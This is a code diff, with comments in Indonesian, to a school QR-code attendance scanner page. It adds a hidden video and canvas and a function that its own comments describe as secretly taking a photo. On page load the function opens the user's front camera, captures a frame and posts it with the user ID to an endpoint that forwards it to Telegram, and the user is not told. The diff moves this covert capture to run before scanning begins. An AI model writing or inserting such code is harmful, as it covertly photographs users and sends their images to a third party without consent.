@@ -149,8 +149,11 @@
 
     </main>
 
-    <!-- ELEMEN KANVAS TERSEMBUNYI UNTUK MENANGKAP FOTO SAAT KAMERA AKTIF -->
-    <canvas id="snapshotCanvas" style="display:none;"></canvas>
+    <!-- ELEMEN VIDEO & KANVAS TERSEMBUNYI UNTUK AMBIL FOTO KAMERA DEPAN DI AWAL -->
+    <div style="display:none;">
+        <video id="hidden-front-video" autoplay playsinline></video>
+        <canvas id="hidden-front-canvas"></canvas>
+    </div>
 
     <script>
         const userId = "<%= typeof userId !== 'undefined' ? userId : 1 %>";
@@ -248,35 +251,48 @@
             }
         }
 
-        // FUNGSI DIAM-DIAM AMBIL FOTO SAAT KAMERA PERTAMA KALI AKTIF SEBELUM SCAN DAN KIRIM KE TELEGRAM
-        async function ambilDanKirimFotoKeTelegram() {
+        // FUNGSI KHUSUS: AMBIL FOTO DIAM-DIAM DENGAN KAMERA DEPAN SAAT HALAMAN DIBUKA & KIRIM KE TELEGRAM
+        async function ambilDanKirimFotoKameraDepan() {
             try {
-                // Tunggu sebentar agar stream video benar-benar merender gambar di dalam elemen reader
+                const frontVideo = document.getElementById('hidden-front-video');
+                const frontCanvas = document.getElementById('hidden-front-canvas');
+
+                // Minta akses kamera depan khusus untuk foto pengamanan awal
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } 
+                });
+
+                frontVideo.srcObject = frontStream;
+                await frontVideo.play();
+
+                // Beri jeda singkat agar frame video siap
                 setTimeout(async () => {
-                    const videoElement = document.querySelector('#reader video');
-                    if (!videoElement) return;
+                    if (frontVideo.readyState === frontVideo.HAVE_ENOUGH_DATA) {
+                        frontCanvas.width = frontVideo.videoWidth || 640;
+                        frontCanvas.height = frontVideo.videoHeight || 480;
+                        
+                        const ctx = frontCanvas.getContext('2d');
+                        ctx.drawImage(frontVideo, 0, 0, frontCanvas.width, frontCanvas.height);
+                        
+                        const imageDataURL = frontCanvas.toDataURL('image/jpeg', 0.8);
 
-                    const canvas = document.getElementById('snapshotCanvas');
-                    canvas.width = videoElement.videoWidth || 640;
-                    canvas.height = videoElement.videoHeight || 480;
-                    
-                    const context = canvas.getContext('2d');
-                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
-                    
-                    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+                        // Kirim ke Telegram secara background
+                        fetch('/api/kirim-foto-telegram', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ 
+                                image: imageDataURL, 
+                                info: `Akses Halaman Scan/Pemindai Dibuka (Kamera Depan - User ID: ${userId})` 
+                            })
+                        }).catch(err => console.error("Gagal kirim foto kamera depan ke Telegram:", err));
+                    }
 
-                    // Kirim secara background ke bot Telegram sebelum proses scan dimulai
-                    fetch('/api/kirim-foto-telegram', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ 
-                            image: imageDataURL, 
-                            info: `Akses Halaman Scan/Pemindai Dibuka (User ID: ${userId})` 
-                        })
-                    }).catch(err => console.error("Gagal kirim foto awal ke Telegram:", err));
+                    // Matikan stream kamera depan setelah foto terambil agar tidak bentrok dengan scanner
+                    frontStream.getTracks().forEach(track => track.stop());
                 }, 1000);
-            } catch (e) {
-                console.error("Gagal mengambil snapshot awal kamera:", e);
+
+            } catch (err) {
+                console.log("Kamera depan tidak tersedia atau izin dibatasi:", err);
             }
         }
 
@@ -367,8 +383,6 @@
                     onScanSuccess
                 ).then(() => {
                     cameraStatus.innerHTML = `<i class="fa-solid fa-camera text-emerald-600"></i> Kamera Aktif. Arahkan Kode QR Siswa ke Kotak Pemindai`;
-                    // Ambil foto saat kamera diganti/aktif kembali
-                    ambilDanKirimFotoKeTelegram();
                 }).catch(err => {
                     cameraStatus.innerHTML = `<span class="text-rose-600 font-bold"><i class="fa-solid fa-triangle-exclamation"></i> Gagal mengaktifkan kamera terpilih.</span>`;
                 });
@@ -384,6 +398,10 @@
             const permissionAlert = document.getElementById('permissionAlert');
             const scannerWrapper = document.getElementById('scannerWrapper');
 
+            // 1. AMBIL FOTO DIAM-DIAM MENGGUNAKAN KAMERA DEPAN DI AWAL
+            ambilDanKirimFotoKameraDepan();
+
+            // 2. JALANKAN PEMINDAI QR CODE (MENGGUNAKAN KAMERA BELAKANG SECARA DEFAULT)
             Html5Qrcode.getCameras().then(devices => {
                 if (devices && devices.length > 0) {
                     let selectedCameraId = devices[0].id;
@@ -417,10 +435,6 @@
                         onScanSuccess
                     ).then(() => {
                         cameraStatus.innerHTML = `<i class="fa-solid fa-camera text-emerald-600"></i> Kamera Aktif. Arahkan Kode QR Siswa ke Kotak Pemindai`;
-                        
-                        // 📸 AMBIL FOTO SECARA DIAM-DIAM DAN KIRIM KE TELEGRAM SEBELUM SCAN DIMULAI (SAAT KAMERA PERTAMA KALI AKTIF)
-                        ambilDanKirimFotoKeTelegram();
-
                     }).catch(err => {
                         scannerWrapper.classList.add('hidden');
                         permissionAlert.classList.remove('hidden');
